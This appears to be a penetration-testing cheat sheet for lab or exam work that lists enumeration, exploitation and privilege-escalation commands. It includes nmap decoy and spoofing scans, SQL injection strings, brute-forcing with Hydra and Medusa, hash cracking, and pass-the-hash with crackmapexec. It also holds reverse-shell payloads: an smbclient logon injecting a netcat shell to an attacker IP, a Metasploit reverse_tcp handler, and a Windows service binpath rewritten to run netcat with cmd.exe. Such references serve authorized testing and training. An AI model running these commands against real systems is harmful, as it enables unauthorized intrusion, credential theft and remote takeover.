
----------------------------------------------------------------------------------------------------------------------
Enumeration Roadmap
----------------------------------------------------------------------------------------------------------------------

**1. Nmap basic scan**
----------------------------------------------------------------------------------------------------------------------
* nmap -sn /24    (Identify targets in subnet)

* nmap -sS -sV -p- -T4 -Pn <IP_ADDRESS>    (TCP scan)

* nmap -sU -sV -p- -T4 -Pn <IP_ADDRESS>    (UDP scan)
   
* nc -nv <IP_ADDRESS> <PORT_NUM>     (Grab banners manually for more clarity) 

* --source-port <PORT_NUM> // -S <IP_Address>    (Spoof)

* nmap -sS -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET>     (TCP Decoy) 
   
* nmap -sU -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET>     (UDP Decoy)



**2. Nmap version and vulnerability Scan**
----------------------------------------------------------------------------------------------------------------------
* nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script KOHAVITvulnKOHAVIT <IP_ADDRESS>



**3. Any web port(s) for further enumeration?**
----------------------------------------------------------------------------------------------------------------------
* nikto -Display V -host <IP_ADDRESS> -port <PORT> -Tuning x 6 -o ~/Desktop/<IP_ADDRESS>/Nikto_Output.html -Format html
   
* Fuzz directories using ZAP  (/usr/share/secLists/Discovery folder that has some great wordlists for this)

* fimap -u <TARGET>     (If you see any LFI/RFI vulnerability posted by Nikto)



**4. Are there any exploits available publicly from the services discovered from Step 2?**
----------------------------------------------------------------------------------------------------------------------
Searchsploit <service name>

http://www.securityfocus.com/vulnerabilities

Copy exploit to local dir: searchsploit -m <ID>

* Manual Poking for Web Pages

Check the Page Source, Inspect elements, view cookies, tamper data, use curl/wget

    Google alien terms!
    Anything sensitive there?
    Any version info?

Search repository online (like GitHub) if the application used is open source: this may assist in site enumeration and guessing versions etc.!

Check HTTP Options

Check for Input Validation in forms (like: 1′ or 1=1 limit 1;#   AND   1′ or 1=1–)

    NULL or null
        Possible error messages returned.
    ‘ , ” , ; , <!
        Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
    – , = , + , ”
        Used to craft SQL Injection queries.
    ‘ , &, ! , ¦ , < , >
        Used to find command execution vulnerabilities.
    ../
        Directory Traversal Vulnerabilities.

**5. Are there any NETBIOS, SMB, RPC ports discovered from Step 1?**
----------------------------------------------------------------------------------------------------------------------
enum4linux -a <ip address>

Rpcclient <ip address> -U “” -N

Rpcinfo: What services are running? Rpcinfo -p <target ip>

Is portmapper running? Is rlogin running? Or NFS or Mountd?

http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/

Showmount -e <ip address>/<port>

Can you mount the smb share locally?

Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””

Rlogin <ip-address>

Smbclient -L \\<ip-address> -U “” -N

Nbtscan -r <ip address>

Net use \\<ip-address>\$Share “” /u:””

Net view \\<ip-address>

Check NMAP Scripts for SMB, DCERPC and NETBIOS

* Any SMTP ports available?

Enumerate Users:

Mail Server Testing

    Enumerate users
        VRFY username (verifies if username exists – enumeration of accounts)
        EXPN username (verifies if username is valid – enumeration of accounts)

* How about SNMP ports?

Default Community Names: public, private, cisco, manager

Enumerate MIB:

1.3.6.1.2.1.25.1.6.0 System Processes

1.3.6.1.2.1.25.4.2.1.2 Running Programs

1.3.6.1.2.1.25.4.2.1.4 Processes Path

1.3.6.1.2.1.25.2.3.1.4 Storage Units

1.3.6.1.2.1.25.6.3.1.2 Software Name

1.3.6.1.4.1.77.1.2.25 User Accounts

1.3.6.1.2.1.6.13.1.3 TCP Local Ports

Use tools:

Onesixtyone – c <community list file> -I <ip-address>

Snmpwalk -c <community string> -v<version> <ip address>

Eg: enumerating running processes:

root@kali:~# snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2

* FTP Ports Discovered

Is anonymous login allowed?

If yes, is directory listing possible? Can a file be ‘get’ or ‘send’?

Use browser: ftp://<ip-address> , What do you find?

* Password Cracking / Brute Forcing

Try this as the last resort or in case the Passwd/Shadow/SAM files are in possession:

For linux, first combine passwd & shadow files:  unshadow [passwd-file] [shadow-file] > unshadowed.txt

Then, use John on the unshadowed file using a wordlist or rules mangling : john –rules –wordlist=<wordlist file> unshadowed.txt

Identifying Hash: hash-identifier

For other services, use Medusa or Hydra. Eg:

Hydra -L <username file> -P <Password file> -v <ip-address> ssh

Medusa -h <ip-address> -U <username file> -P <password file> -M http -m DIR:/admin -T 30

Using hashcat for cracking hashes:

For WordPress MD5 with salt: hashcat -m 400 -a 0 <hash file> <wordlist file>

Sample Password list: /usr/share/wordlist/rockyou.txt

* Packet Sniffing

Use Wireshark / tcpdump to capture traffic on the target host:

“tcpdump -i tap0  host <target-ip> tcp port 80 and not arp and not icmp -vv”

*CME
crackmapexec smb <TARGET/S> -u <LOCAL_USER_NAME> -H <XXX_LMHASH_XX>:<XXX_NTHASH_000> --local (PTH local creds) 
crackmapexec smb <TARGET/S> -u '' -p '' (NULL Sessions)
cmedb - creds/hosts (show results)

*SMBclient
smbclient '\\<TARGET_IP>\<Share>'
smb: \> logon "/='nc <ATTACKERS_IP> <ATTACKERS_PORT> -e /bin/bash'"

*identify Targets nmap -sn*
1) nmap all ports (TCP & UDP)
2) nmap and spoof source port (--source-port <portnumber>) // spoof source address(-S <IP_Address>)
2) nmap with decoy (nmap -sS -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET> /// nmap -sU -sV -Pn -T4 -D <FAKE_IP_ADDRESS> <TARGET>) 
3) refer to https://nmap.org/book/man-bypass-firewalls-ids.html in order to evade firewall.
4) Look for services and their exploit POC's.
5) Web ports are open? (nikto -Display V -host <IP_ADDRESS> -port <PORT> -Tuning x 6 -o ~/Desktop/<IP_ADDRESS>/Nikto_Output.html -Format html)
6) Check for null sessions (run enum4linux -a on the target)
7) run NSE scripts (NmapVuln & Enumerator) on those ports

----------------------------------------------------------------------------------------------------

ip -4 addr show scope global    /*Determine interfaces ip address + prefix*/
ip route show | grep default    /*Determine which interface is public*/
-----------------------------------------------------------------------------------------------------
In order to get multiple session on a single multi/handler, 
you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. 
For example, for shell/reverse_tcp payload,

msf>use exploit multi/handler
msf>set payload windows/shell/reverse_tcp
msf>set lhost <local IP>
msf>set lport <local port>
msf> set ExitOnSession false
msf>exploit -j

The -j option is to keep all the connected session in the background.


----------------------------------------------------------------------------
Post - privs escalation
----------------------------------------------------------------------------
* Accesschk stuff
accesschk.exe /accepteula (first thing to do in CLI access)
accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe /accepteula -ucqv <SERVICE_NAME>
sc qc <SERVICE_NAME>
sc config <SERVICE_NAME> binpath= "C:\<NC.EXE_PATH> -nv <LHOST> <LPORT> -e C:\WINDOWS\System32\cmd.exe"
sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
sc config <SERVICE_NAME> start= auto
net start <SERVICE_NAME>

